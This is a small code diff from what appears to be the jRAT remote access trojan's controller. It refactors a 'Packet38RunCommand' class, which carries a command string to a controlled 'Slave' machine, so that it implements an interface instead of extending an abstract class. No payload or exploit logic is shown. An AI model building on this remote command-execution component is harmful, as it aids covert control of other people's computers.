@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet38RunCommand extends AbstractOutgoingPacket {
+public class Packet38RunCommand implements OutgoingPacket {
 
 	private String command;
 
